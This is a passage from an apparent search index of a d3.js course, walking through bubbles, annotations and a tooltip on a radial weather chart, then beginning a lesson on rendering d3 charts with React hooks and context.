<p>{lang=javascript,crop-query=.cloudRadiusScale} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>At the end of our Draw data step, let's create a new <code>&lt;g&gt;</code> to contain our cloud circles, then declare their offset from the center of our chart.</p> <p>{lang=javascript,crop-query=.cloudGroup-.cloudOffset} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Now we can draw one circle per day, setting each circle's radius with our new <code>cloudRadiusScale</code>.</p> <p>{lang=javascript,crop-query=.cloudDots} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Great! Now we can see a ring of \"clouds\" around the outside of our chart.</p> <p>{width=75%} </p> <p>Let's set their <code>fill</code> color in our <code>styles.css</code> file, dimming them so they are a more natural \"cloud\" color, and so they don't visually dominate our chart.</p> <p><pre><code>.cloud-dot {\n    fill: #c8d6e5;\n}\n</code></pre></p> <p>Let's also make our cloud circles somewhat translucent, so that larger circles don't completely cover their smaller neighbors.</p> <pre><code>.cloud-dot {\n    fill: #c8d6e5;\n    opacity: 0.6;\n}\n</code></pre> <p>{width=75%} </p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.06/adding-the-cloud-cover-bubbles/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_06/lesson_06.07/adding-the-precipitation-bubbles/","title":"Adding the precipitation bubbles","text":"<p>Next, we want to add a row of bubbles corresponding to each day's precipitation. We have two relevant metrics: probability of precipitation and type of precipitation. Let's visualize the probability with the size of the bubble and the type with the color of the bubble. This way, we can play to both dimensions' strengths -- a large amount of blue will correspond to a high probability of rain. And we won't see a lot of a color if we're not confident that it did precipitate.</p> <p>To start, we'll create a scale to convert the probability of precipitation to the radius of a bubble. We'll make these circles a little smaller than our cloud circles, since they're closer to the middle of our circle (and thus have less space).</p> <p>A&gt;This code will go at the end of our Create scales step.</p> <p>{lang=javascript,crop-query=.precipitationRadiusScale} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Next, we'll list out the types of precipitation in our dataset, then create a color scale mapping those types to different colors. We'll want to use an ordinal scale, since this is an ordinal metric, and can be placed in categories with a natural order (remember the types of data we learned in Module 6?).</p> <p>{lang=javascript,crop-query=.precipitationTypes-.precipitationTypeColorScale} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Scrolling back down to the end of our Draw data step, we'll draw our circles similarly to how we drew our cloud circles. This time, we'll use our <code>precipitationTypeColorScale</code> to set each circle's <code>fill</code> color.</p> <p>{lang=javascript,crop-query=.precipitationGroup-.precipitationDots} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Great! Now we can see our inner circle of precipitation bubbles.</p> <p>{width=75%} </p> <p>Let's make these bubbles translucent as well, in our <code>styles.css</code> file:</p> <pre><code>.precipitation-dot {\n    opacity: 0.5;\n}\n</code></pre> <p>That's better!</p> <p>{width=75%} </p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.07/adding-the-precipitation-bubbles/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_06/lesson_06.08/adding-annotations/","title":"Adding annotations","text":"<p>Let's take a step back and look at our charts through a new viewer's eyes.</p> <p>{width=75%} </p> <p>There's a lot going on and not much explanation. A new viewer might wonder: what does this blue dot represent? What are these yellow slashes? The goal of data visualization is communication - and being clear is important for effective communication.</p> <p>Let's add some annotations to help orient a new viewer. We have a lot of things that need explanation, so let's start by creating a function that will draw an annotation, give three parameters:</p> <ol> <li>the angle around our circle</li> <li>the offset from the center of our circle to start our line at</li> <li>the text that we want to display</li> </ol> <p>We'll also create a <code>&lt;g&gt;</code> element to contain all of our annotations.</p> <pre><code>const annotationGroup = bounds.append(\"g\")\n\nconst drawAnnotation = (angle, offset, text) =&gt; {\n}\n</code></pre> <p>Within our <code>drawAnnotation()</code> function, we want to draw a <code>&lt;line&gt;</code> that extends from our <code>offset</code> to a set distance from the center of our chart. Let's draw our lines out to 1.6 times our circle's radius, just outside of our cloud bubbles. We'll also want a <code>&lt;text&gt;</code> element to display the text of our annotation, which we'll draw at the outer end of our <code>&lt;line&gt;</code>.</p> <p>{lang=javascript,crop-query=.drawAnnotation} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>We'll want our <code>&lt;line&gt;</code> to have a light stroke and our <code>&lt;text&gt;</code> to be vertically centered with the end of our <code>&lt;line&gt;</code>. Let's add those styles to our <code>styles.css</code> file.</p> <pre><code>.annotation-line {\n    stroke: #34495e;\n    opacity: 0.4;\n}\n\n.annotation-text {\n    fill: #34495e;\n    font-size: 0.7em;\n    dominant-baseline: middle;\n}\n</code></pre> <p>Going back to our <code>chart.js</code> file, let's draw our first two annotations. To keep the top of our chart as clean as possible, let's create an annotation for the outer two data elements: cloud and precipitation bubbles.</p> <p>We'll want to draw these annotations in the top right of our chart, to prevent from stealing the show too early. If our annotations were in the top left, viewers might read them first (since English text usually runs from left-to-right, top-to-bottom). We'll set the <code>angle</code> of these two annotations around \u03c0 / 4, which is one-eight of a turn around our chart.</p> <p>And for our annotations' <code>offset</code>, we can use the offsets we defined when we drew each set of bubbles.</p> <pre><code>drawAnnotation(Math.PI * 0.23, cloudOffset, \"Cloud Cover\")\ndrawAnnotation(Math.PI * 0.26, precipitationOffset, \"Precipitation\")\n</code></pre> <p>Wonderful! Our annotations fit in between two of our month labels, preventing any overlap.</p> <p>{width=75%} </p> <p>We'll draw the rest of our annotations in the bottom right of our chart, making sure to tell our viewers what the exact UV index threshold is.</p> <pre><code>drawAnnotation(Math.PI * 0.734, UvOffset + 0.05, `UV Index over ${\n  uvIndexThreshold\n}`)\ndrawAnnotation(Math.PI * 0.7, 0.5, \"Temperature\")\ndrawAnnotation(\n Math.PI * 0.9,\n radiusScale(32) / dimensions.boundedRadius,\n \"Freezing Temperatures\"\n)\n</code></pre> <p>A&gt;Note that we had to convert our freezing point into a value relative to our bounded radius, since our <code>drawAnnotation()</code> function takes an <code>offset</code> instead of a <code>radius</code> value.</p> <p>Hmm, our longer annotation labels are cut off.</p> <p>{width=75%} </p> <p>We could increase the size of our right margin, but that would un-center our chart within our wrapper. Not a big deal, but let's look at an alternative: prevent overflowing svg elements from being clipped.</p> <p>In our <code>styles.css</code> file, let's change the <code>overflow</code> property of our <code>svg</code> from the default of <code>hidden</code>.</p> <pre><code>svg {\n    overflow: visible;\n}\n</code></pre> <p>Easy peasy! Now we can see the end of our annotations. Be careful, though, when using this workaround in complicated pages -- you don't want your chart to run into other elements on your page!</p> <p>{width=75%} </p> <p>This looks great, but feel free to play around with the <code>angle</code> of your annotations. Maybe you would group all of your annotation labels in the top right. Keep in mind that irregular shapes waste more space in many page layouts.</p> <p>If we again view our chart with a new viewer's eyes, each part is way more clear! We are missing one thing, though: the precipitation type colors are still un-labeled.</p> <p>Let's loop over each of our precipitation types, creating one <code>&lt;circle&gt;</code> to show the color and one <code>&lt;text&gt;</code> element to label the color.</p> <pre><code>precipitationTypes.forEach((precipitationType, index) =&gt; {\n const labelCoordinates = getCoordinatesForAngle(Math.PI * 0.26, 1.6)\n annotationGroup.append(\"circle\")\n     .attr(\"cx\", labelCoordinates[0] + 15)\n     .attr(\"cy\", labelCoordinates[1] + (16 * (index + 1)))\n     .attr(\"r\", 4)\n     .style(\"opacity\", 0.7)\n     .attr(\"fill\", precipitationTypeColorScale(precipitationType))\n annotationGroup.append(\"text\")\n     .attr(\"class\", \"annotation-text\")\n     .attr(\"x\", labelCoordinates[0] + 25)\n     .attr(\"y\", labelCoordinates[1] + (16 * (index + 1)))\n     .text(precipitationType)\n})\n</code></pre> <p>Great! Now a new viewer is quickly oriented and can figure out what each data element represents.</p> <p>{width=75%} </p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.08/adding-annotations/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_06/lesson_06.09/adding-the-tooltip/","title":"Adding the tooltip","text":"<p>Now for the fun part: adding interactions! Although our viewers can orient themselves to the different parts of our chart, we also want them to be able to dig in and view details about a particular day.</p> <p>Let's add a tooltip that shows up when the user hovered anywhere over the chart. We'll want to start by adding a listener element that covers our whole chart and initializing our mouse move events.</p> <pre><code>const listenerCircle = bounds.append(\"circle\")\n   .attr(\"class\", \"listener-circle\")\n   .attr(\"r\", dimensions.width / 2)\n   .on(\"mousemove\", onMouseMove)\n   .on(\"mouseleave\", onMouseLeave)\n\nfunction onMouseMove(e) {\n}\n\nfunction onMouseLeave() {\n}\n</code></pre> <p>Perfect, the black area covers exactly where we want any movement to trigger a tooltip.</p> <p>{width=75%} </p> <p>Let's hide our listener by making its <code>fill</code> <code>transparent</code>.</p> <pre><code>.listener-circle {\n  fill: transparent;\n}\n</code></pre> <p>Next, we'll need to create our tooltip element in our <code>index.html</code> file, with a spot for each of our hovered over day's metrics to be displayed.</p> <pre><code>&lt;div id=\"tooltip\" class=\"tooltip\"&gt;\n   &lt;div id=\"tooltip-date\" class=\"tooltip-date\"&gt;&lt;/div&gt;\n   &lt;div id=\"tooltip-temperature\" class=\"tooltip-temperature\"&gt;\n       &lt;span id=\"tooltip-temperature-min\"&gt;&lt;/span&gt;\n       -\n       &lt;span id=\"tooltip-temperature-max\"&gt;&lt;/span&gt;\n   &lt;/div&gt;\n   &lt;div class=\"tooltip-metric tooltip-uv\"&gt;\n       &lt;div&gt;UV Index&lt;/div&gt;\n       &lt;div id=\"tooltip-uv\"&gt;&lt;/div&gt;\n   &lt;/div&gt;\n   &lt;div class=\"tooltip-metric tooltip-cloud\"&gt;\n       &lt;div&gt;Cloud Cover&lt;/div&gt;\n       &lt;div id=\"tooltip-cloud\"&gt;&lt;/div&gt;\n   &lt;/div&gt;\n   &lt;div class=\"tooltip-metric tooltip-precipitation\"&gt;\n       &lt;div&gt;Precipitation Probability&lt;/div&gt;\n       &lt;div id=\"tooltip-precipitation\"&gt;&lt;/div&gt;\n   &lt;/div&gt;\n   &lt;div class=\"tooltip-metric tooltip-precipitation-type\"&gt;\n       &lt;div&gt;Precipitation Type&lt;/div&gt;\n       &lt;div id=\"tooltip-precipitation-type\"&gt;&lt;/div&gt;\n   &lt;/div&gt;\n&lt;/div&gt;\n</code></pre> <p>Let's also add our tooltip styles in our <code>styles.css</code> file, remembering to hide our tooltip and to give our wrapper a <code>position</code> to create a new context.</p> <pre><code>.wrapper {\n    position: relative;\n}\n\n.tooltip {\n    opacity: 0;\n    position: absolute;\n    top: 0;\n    left: 0;\n    width: 15em;\n    padding: 0.6em 1em;\n    background: #fff;\n    text-align: center;\n    line-height: 1.4em;\n    font-size: 0.9em;\n    border: 1px solid #ddd;\n    z-index: 10;\n    pointer-events: none;\n}\n\n.tooltip-date {\n    margin-bottom: 0.2em;\n    font-weight: 600;\n    font-size: 1.1em;\n    line-height: 1.4em;\n}\n\n.tooltip-temperature {\n    font-feature-settings: 'tnum' 1;\n}\n\n.tooltip-metric {\n    display: flex;\n    justify-content: space-between;\n    width: 100%;\n    font-size: 0.8em;\n    line-height: 1.3em;\n    transition: all 0.1s ease-out;\n}\n\n.tooltip-metric div:first-child {\n    font-weight: 800;\n    padding-right: 1em;\n}\n\n.tooltip-metric div:nth-child(2) {\n    font-feature-settings: 'tnum' 1;\n}\n\n.tooltip-cloud {\n    color: #8395a7;\n}\n.tooltip-uv {\n    color: #feca57;\n}\n</code></pre> <p>Switching back in our <code>chart.js</code> file, we'll want to grab our <code>tooltip</code> element to reference later, and also make a <code>&lt;path&gt;</code> element to highlight the hovered over day.</p> <pre><code>const tooltip = d3.select(\"#tooltip\")\nconst tooltipLine = bounds.append(\"path\")\n    .attr(\"class\", \"tooltip-line\")\n</code></pre> <p>Now we can fill out our <code>onMouseMove()</code> function. Let's start by grabbing the <code>x</code> and <code>y</code> position of our cursor, using <code>d3.pointer()</code>.</p> <pre><code>function onMouseMove(e) {\n  const [x, y] = d3.pointer(e)\n  // ...\n</code></pre> <p>We have our mouse position, but we need to know the angle from the chart origin. How do we convert from an <code>[x, y]</code> position to an angle? We'll need to use an inverse trigonometric function: atan2. If you're curious, read more about atan2 here.</p> <p>{lang=javascript,crop-query=.getAngleFromCoordinates} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Remember that these trigonometric functions originate around the horizontal, right plane of our circle. Let's rotate the resulting angle back one-quarter turn around the circle to match our date scale.</p> <pre><code>let angle = getAngleFromCoordinates(x, y) + Math.PI / 2\n</code></pre> <p>To keep our angles positive, we'll want to rotate any negative angles around our circle by one full turn, so they fit on our <code>angleScale</code>.</p> <pre><code>if (angle &lt; 0) angle = (Math.PI * 2) + angle\n</code></pre> <p>We want to draw a line to highlight the date we're hovering, but it needs to increase in width as it gets further from the center of our circle. To create this shape, we'll use <code>d3.arc()</code>, which is the arc version of the line generators we've been using (<code>d3.line()</code>). We can use the <code>.innerRadius()</code> and <code>outerRadius()</code> methods to tell it how long we want our arc to be, and the <code>.startAngle()</code> and <code>.endAngle()</code> methods to tell it how wide we want our arc to be.</p> <p>{lang=javascript,crop-query=.tooltipArcGenerator} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Now we can use our new arc generator to create the <code>d</code> attribute for our tooltip line.</p> <pre><code>tooltipLine.attr(\"d\", tooltipArcGenerator())\n    .style(\"opacity\", 1)\n</code></pre> <p>Perfect! Now we have a line that follows our cursor around the center of our circle.</p> <p>{width=75%} </p> <p>Let's lighten the line in our <code>styles.css</code> file to prevent it from covering the data we want to highlight. We can use <code>mix-blend-mode: multiply</code> to make the covered data elements stand out a little.</p> <pre><code>.tooltip-line {\n    fill: #8395a7;\n    fill-opacity: 0.2;\n    mix-blend-mode: multiply;\n    pointer-events: none;\n}\n</code></pre> <p>Much better!</p> <p>{width=75%} </p> <p>Next, we'll want to position our tooltip at the end of our line. First, we'll grab the <code>[x, y]</code> coordinates of this point.</p> <p>{lang=javascript,crop-query=.outerCoordinates} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>Using these coordinates, we'll set the <code>transform</code> CSS property of our <code>tooltip</code>. We have some fancy math here, using the CSS <code>calc()</code> function to choose which side of our tooltip to anchor to the <code>outerCoordinate</code>, based on where we are around the circle. We don't want our tooltip to cover our chart!</p> <p>Try to work through each line to figure out what is going on, and inspect the tooltip in the Elements tab of your dev tools to see the resulting <code>transform</code> value.</p> <pre><code>tooltip.style(\"opacity\", 1)\n   .style(\"transform\", `translate(calc(${\n     outerCoordinates[0] &lt; - 50 ? \"40px - 100\" :\n     outerCoordinates[0] &gt; 50 ? \"-40px + 0\" :\n     \"-50\"\n   }% + ${\n     outerCoordinates[0]\n      + dimensions.margin.top\n      + dimensions.boundedRadius\n   }px), calc(${\n     outerCoordinates[1] &lt; - 50 ? \"40px - 100\" :\n     outerCoordinates[1] &gt; 50 ? \"-40px + 0\" :\n     \"-50\"\n   }% + ${\n     outerCoordinates[1]\n      + dimensions.margin.top\n      + dimensions.boundedRadius\n   }px))`)\n</code></pre> <p>Wonderful! Now our tooltip follows the end of our tooltip line when we move our mouse around our chart.</p> <p>{width=75%} </p> <p>Next, we need to update the text of our tooltip to show information about the date we're hovering over. We can use the <code>.invert()</code> method of our <code>angleScale()</code> to convert backwards, from its range dimension (angle) to its domain dimension (date).</p> <pre><code>const date = angleScale.invert(angle)\n</code></pre> <p>If we format this <code>date</code> similarly to the dates in our dataset, we can look for a data point with the same date string.</p> <pre><code>const dateString = d3.timeFormat(\"%Y-%m-%d\")(date)\nconst dataPoint = dataset.filter(d =&gt; d.date == dateString)[0]\n</code></pre> <p>If no such <code>date</code> exists, we should exit this function early. This should never happen, but is possible with a dataset that skips dates.</p> <pre><code>if (!dataPoint) return\n</code></pre> <p>Now that we have the data for the date we're hovering over, we can populate the text of our tooltip.</p> <pre><code>tooltip.select(\"#tooltip-temperature-min\")\n   .html(`${d3.format(\".1f\")(temperatureMinAccessor(dataPoint))}\u00b0F`)\ntooltip.select(\"#tooltip-temperature-max\")\n   .html(`${d3.format(\".1f\")(temperatureMaxAccessor(dataPoint))}\u00b0F`)\ntooltip.select(\"#tooltip-uv\")\n   .text(uvAccessor(dataPoint))\ntooltip.select(\"#tooltip-cloud\")\n   .text(cloudAccessor(dataPoint))\ntooltip.select(\"#tooltip-precipitation\")\n   .text(d3.format(\".0%\")(precipitationProbabilityAccessor(dataPoint)))\ntooltip.select(\"#tooltip-precipitation-type\")\n   .text(precipitationTypeAccessor(dataPoint))\ntooltip.select(\".tooltip-precipitation-type\")\n   .style(\"color\", precipitationTypeAccessor(dataPoint)\n     ? precipitationTypeColorScale(precipitationTypeAccessor(dataPoint))\n     : \"#dadadd\")\n</code></pre> <p>Notice that we're also setting the <code>color</code> of our precipitation type label and value, re-enforcing the relationship between the precipitation type and its color.</p> <p>{width=90%} </p> <p>Let's take this one step further! We're using a gradient of colors to show what temperatures each day spans. At the end of our Create scales step, let's create a new scale that maps temperatures to the gradient scale we're using.</p> <p>{lang=javascript,crop-query=.temperatureColorScale} &lt;&lt;code/11-radar-weather-chart/completed/chart.js</p> <p>A&gt;We're using a sequential scale here instead of a linear scale because we want to use one of d3's built-in color scales (<code>d3.interpolateYlOrRd</code>) as an <code>.interpolator()</code> instead of specifying a range.</p> <p>Now we can use this scale to color the minimum and maximum temperatures for our hovered date.</p> <pre><code>tooltip.select(\"#tooltip-temperature-min\")\n   .style(\"color\", temperatureColorScale(\n     temperatureMinAccessor(dataPoint)\n    ))\ntooltip.select(\"#tooltip-temperature-max\")\n   .style(\"color\", temperatureColorScale(\n     temperatureMaxAccessor(dataPoint)\n    ))\n</code></pre> <p>And voila! Our tooltip is chock full of helpful information, and it also helps re-enforce some of the data visualization in our main chart.</p> <p>{width=90%} </p> <p></p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.10/wrapping-up/","title":"Wrapping up","text":"<p>Give yourself a pat on the back, this one was a doozy! Take a step back and look at the visualization we've created. The viewer gets a good sense of the annual weather, and has the ability to explore further, but isn't instantly overwhelmed with information.</p> <p></p> <p>Make sure to show off your chart with friends and on social media! It will be interesting to compare these charts with weather data from different places.</p> <p>Hopefully this project gave you a better idea of the process involved in making a more complicated chart. Often, we have to research new concepts and learn new parts of the d3.js api when making a chart -- if we're making a circular chart for the first time, we might need to refresh our trigonometry knowledge and look up ways to draw, for example, arcs.</p>"},{"location":"datav/codes/code/course-full/module_06/lesson_06.11/exercise-week-7/","title":"This week's exercise","text":"<p>Awesome work getting through that crazy data visualization! During this week, create your own complex data visualization. This could be an extension of one of your previous exercises, or a totally new project.</p> <p>If you're looking for inspiration, dig through our list of fun datasets. Make sure to choose a dataset that interests you - it'll be more fun if you're curious about the data itself. Or, you could make something new with our current weather data.</p> <p>I'd recommend:</p> <ol> <li>picking a dataset</li> <li>familiarizing yourself with the data - what metrics are available, and what types of data are the?</li> <li>brainstorm several ways to visualize these metrics - remember our dimensions in Module 6. I love doing this step with pen &amp; paper, which feels really free.</li> <li>fork or create a new Codesandbox and start going through our chart steps!</li> </ol> <p>Now, create your own complex data visualization.</p> <p>If you get stuck, watch this week's videos again or post a question inline or on the Discord channel. Good luck! We're rooting for you!</p> <p>And once you're finished, show off your wonderful custom visualization on Twitter or on the Discord! We'd love to see it!</p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.00/using-d3-with-js-frameworks/","title":"D3 + Javascript Frameworks","text":"<p>We know how to make individual charts, but you might ask: what's the best way to draw a chart within my current JavaScript framework? D3 can be viewed as a utility library, but it's also used to manipulate the DOM, which means that there is a fair bit of overlap in functionality between a JavaScript framework like React and d3 \u2014 let's talk about the best way to handle that overlap.</p> <p>First off, we should decide when to use d3. Should we use d3 to render a whole page?</p> <p>Let's split up d3's functionality by concern:</p> <ol> <li>DOM manipulation (like jQuery)</li> <li>Data manipulation (manipulation, interpolation, basic stats)</li> </ol> <p>With the library compartmentalized in this way, you might come up with unorthodox ways to utilize d3. For example, I recently used it to create a calendar date picker.</p> <p></p> <p>This date picker doesn't look like a chart, but d3 came in handy in a few ways.</p> <ul> <li>d3-date helps with splitting up a date range into weeks</li> <li>d3-date helps with calculating date range defaults \u2014 for example, if a user selects Last Week, the date picker will use d3.timeWeek.floor() and d3.timeWeek.ceil() to find the start and end of the week.</li> <li>d3-scale helps with creating a color scale to show data values between each day. This helps users know which days to select based on the data (in this case, online attention to a specific topic).</li> <li>d3-time-format helps to display each day's day of the month and the input values on the bottom left.</li> <li>d3-selection helps create mouse events to select days on hover when a user has selected their start date and will select their end date.</li> </ul> <p>A d3 novice might not think to utilize d3 in this way, but once you get through this course, you will be familiar enough to take full advantage of the d3 library.</p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.00/using-d3-with-js-frameworks/#our-game-plan","title":"Our game plan","text":"<p>There are many javascript frameworks out there that are used to build complex web applications. The basic principles of combining d3 with a framework apply to all of them: we'll cover those principles with a specific example (React.js). If you use React, great! If not, follow along anyway and learn the general principles - we run through a few other examples near the end (Angular.js &amp; Svelte.js) to show how these principles can be generalized.</p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.01/react-js/","title":"React.js","text":"<p>React.js is a framework for building declarative, module-based user interfaces. It helps you split your interface code into components, which each have a <code>render</code> function that describes the resulting DOM structure. One of React's greatest strengths is its diffing algorithm, which ensures minimal DOM updates, which are relatively expensive.</p> <p>If you're unfamiliar with React, spend some time running through an introduction like this one. Our walkthrough will assume a basic understanding of the core concepts since we want to focus on the d3 and React bits.</p> <p>In this module, we'll write React components' render methods in JSX, which is an HTML-like syntax. We'll also be using hooks, which were released in the v16.8 release \u2014 don't worry about versioning here, we'll get all set up in a minute. Hooks are a way to use state and lifecycle methods without making a class component, and also help share code between components. We'll even use our own custom hook!</p> <p>But wait a minute, it seems like React and d3 are both used to create elements and update the DOM. To draw a chart, should we use both of libraries? Just one? Neither?</p> <p>Having just gotten comfortable with d3, you probably aren't going to like the answer. Instead of using axis generators and letting d3 draw elements, we're going to let React handle the rendering and to use d3 as a (very powerful) utility library. Let's build an example chart library and see for ourselves why this makes the most sense.</p> <p>A&gt;For a detailed run-down of the different d3.js modules and which ones are involved with common use cases, check out this Intro to D3 blog post.</p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.02/digging-in/","title":"Digging in","text":"<p>Our code for this chapter is a very bare bones React app. You should see an empty dashboard with three placeholders \u2014 one for a timeline, one for a scatter plot, and one for a histogram.</p> <p></p> <p>When we're finished, our dashboard will look like this:</p> <p></p> <p>Within the <code>src</code> folder, we have an <code>App</code> component that is loading random data and updating it every four seconds \u2014 this will help us design our chart transitions.</p> <p>Our chart-making plan has four levels of components:</p> <ol> <li>App, which will decide what our dataset is and how to access values for our axes (accessors),</li> <li>Timeline, ScatterPlot, or Histogram which will be re-useable components that decide how a specific type of chart is laid out and what goes in it,</li> <li>Chart, which will pass down chart dimensions, and</li> <li>Axis, Line, Bars, etc., which will create individual components within our charts.</li> </ol> <p>Levels 3 and 4 will be isolated in the <code>Chart</code> folder, creating a charting library that can be used throughout the app to make many types of charts. Having a basic charting library will help in many ways, such as abstracting svg components idiosyncracies (for example, collaborators won't need to know that you need to use a <code>&lt;rect&gt;</code> to create a rectangle, and it takes a x attribute whereas a <code>&lt;circle&gt;</code> takes a cx attribute).</p> <p>We'll start by fleshing out our <code>Timeline</code> component, running through our usual chart making steps.</p> <ol> <li>Access data</li> <li>Create dimensions</li> <li>Draw canvas</li> <li>Create scales</li> <li>Draw data</li> <li>Draw peripherals</li> <li>Set up interactions</li> </ol>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.02/digging-in/#access-data","title":"Access data","text":"<p>Let's open up our Timeline component, located in <code>src/Timeline.jsx</code>. There's not much in here: the bones of a React component, prop types, and all of the imports we'll need.</p> <pre><code>const Timeline = ({ data, xAccessor, yAccessor, label }) =&gt; {\n  return (\n    &lt;div className=\"Timeline\"&gt;\n    &lt;/div&gt;\n  )\n}\n</code></pre> <p>Our <code>Timeline</code> component takes four props:</p> <ol> <li><code>data</code></li> <li><code>xAccessor</code></li> <li><code>yAccessor</code></li> <li><code>label</code></li> </ol> <p>We can see that these accessor functions are already defined in <code>App.jsx</code>. These props are flexible enough to support throwing a timeline anywhere in our dashboard with any dataset. But we don't have so many props that creating a new timeline is overwhelming or allows us to create inconsistent timelines.</p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.02/digging-in/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_07/lesson_07.03/creating-dimensions-in-react/","title":"Creating dimensions","text":"<p>Next up, we need to specify the size of our chart. In our dashboard, we could have Timelines of many different sizes. Each of these Timelines are also likely to change size based on the window size. To keep things flexible, we'll need to grab the dimensions of our container <code>&lt;div&gt;</code>.</p> <p>We could implement this by hand by creating a React ref, querying the size of <code>ref.current</code>, and instantiating a Resize Observer to update on resize. Because we'll use this same logic in multiple chart types, we created a custom React hook called <code>useChartDimensions</code>.</p> <p><code>useChartDimension</code> will accept an object of dimension overrides and return an array with two values:</p> <ol> <li>a reference for a React ref</li> <li>a <code>dimensions</code> object that looks like:</li> </ol> <pre><code>{\n  width: 1000,\n  height: 1000,\n  marginTop: 100,\n  marginRight: 100,\n  marginBottom: 100,\n  marginLeft: 100,\n  boundedHeight: 800,\n  boundedWidth: 800,\n}\n</code></pre> <p>A&gt;To keep things simple, this object is flat, unlike some <code>dimensions</code> objects we've used before. In practice, if you need to rely on a specific structure for your <code>dimensions</code> object, it might be better to keep it flat instead of nesting <code>margins</code> inside another object.</p> <p>We won't get into what that code looks like, but you can give it a look over in the <code>src/Chart/utils.js</code> file.</p> <p>First, we'll use our hook and pull out the ref reference and the calculated dimensions.</p> <pre><code>const Timeline = ({ data, xAccessor, yAccessor, label }) =&gt; {\n  const [ref, dms] = useChartDimensions()\n\n  return (\n    &lt;div className=\"Timeline\" ref={ref}&gt;\n    &lt;/div&gt;\n  )\n}\n</code></pre> <p>Then, we will tag our container <code>&lt;div&gt;</code> with our <code>ref</code>.</p> <pre><code>&lt;div className=\"Timeline\" ref={ref}&gt;\n&lt;/div&gt;\n</code></pre> <p>And voila! If we <code>console.log(dms)</code> before our render method, we can see that our dimensions are populated and update when we resize our window.</p> <p></p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.03/creating-dimensions-in-react/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_07/lesson_07.04/drawing-our-canvas-in-react/","title":"Drawing our canvas in React","text":""},{"location":"datav/codes/code/course-full/module_07/lesson_07.04/drawing-our-canvas-in-react/#drawing-our-canvas","title":"Drawing our canvas","text":"<p>Next up, we need to create our canvas. Since we'll want a canvas for all of our charts, we can put most of this logic in the <code>Chart</code> component. Let's add a <code>Chart</code> to our render method and pass it our <code>dimensions</code>.</p> <pre><code>&lt;div className=\"Timeline\" ref={ref}&gt;\n  &lt;Chart dimensions={dms}&gt;\n  &lt;/Chart&gt;\n&lt;/div&gt;\n</code></pre> <p>When we look at our dashboard again, not much has changed. Let's open up <code>src/Chart/Chart.jsx</code> to see what we're starting with.</p> <p><code>Chart</code> is a very basic functional React component \u2014 it asks for only one prop: <code>dimensions</code>.</p> <p>A&gt;We're defining <code>useDimensionsContext()</code> at the top of our file as an empty function to prevent import errors in another file. We'll update it in a minute.</p> <pre><code>export const useDimensionsContext = () =&gt; {}\n\nconst Chart = ({ dimensions, children }) =&gt; (\n  &lt;svg className=\"Chart\"&gt;\n    { children }\n  &lt;/svg&gt;\n)\n</code></pre> <p>The <code>children</code> in a <code>Chart</code> can be any component from our chart library (or raw SVG elements). Each of these components might need to know the dimensions of our chart \u2014 for example, an <code>Axis</code> component might need to know how tall to be. Instead of passing <code>dimensions</code> to each of these components as a prop, we can create a React Context that defines the dimensions for the whole chart.</p> <p>First, we'll use the native React <code>createContext()</code> to create a new context \u2014 this code will go outside of the component, after our imports.</p> <pre><code>const ChartContext = createContext()\n</code></pre> <p>Next up, we can fill out our <code>useDimensionsContext()</code> variable to create a more descriptive, easy-to-grab function that Chart components can use.</p> <pre><code>export const useDimensionsContext = () =&gt; useContext(ChartContext)\n</code></pre> <p>Lastly, we need to add the context provider to our render method and specify that we want the context consumers to receive our <code>dimensions</code> object.</p> <pre><code>const Chart = ({ dimensions, children }) =&gt; (\n  &lt;ChartContext.Provider value={dimensions}&gt;\n    &lt;svg className=\"Chart\"&gt;\n      { children }\n    &lt;/svg&gt;\n  &lt;/ChartContext.Provider&gt;\n)\n</code></pre> <p>Great! Now all our chart components need to do to access the chart dimensions is to grab the value from <code>useDimensionsContext()</code>.</p> <p>Next up, we'll use those <code>dimensions</code> to create our chart wrapper and bounds. If you remember from Module 1, our wrapper spans the full height and width of the chart and the bounds respect the chart margins.</p> <p></p> <p>Let's specify the width and height of the <code>&lt;svg&gt;</code> element.</p> <pre><code>&lt;svg\n  className=\"Chart\"\n  width={dimensions.width}\n  height={dimensions.height}&gt;\n  { children }\n&lt;/svg&gt;\n</code></pre> <p>Lastly, we'll create our chart bounds to shift our chart components and enforce our top and left margins.</p> <pre><code>&lt;svg\n  className=\"Chart\"\n  width={dimensions.width}\n  height={dimensions.height}&gt;\n  &lt;g transform={`translate(${\n    dimensions.marginLeft\n  }, ${\n    dimensions.marginTop\n  })`}&gt;\n    { children }\n  &lt;/g&gt;\n&lt;/svg&gt;\n</code></pre> <p>Perfect! Our <code>Chart</code> component is ready to go. We won't be able to see the difference on our webpage, but we can see our wrapper components in the Elements panel of our dev tools.</p> <p></p>"},{"location":"datav/codes/code/course-full/module_07/lesson_07.04/drawing-our-canvas-in-react/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_07/lesson_07.05/creating-our-scales-in-react/","title":"Creating our scales in 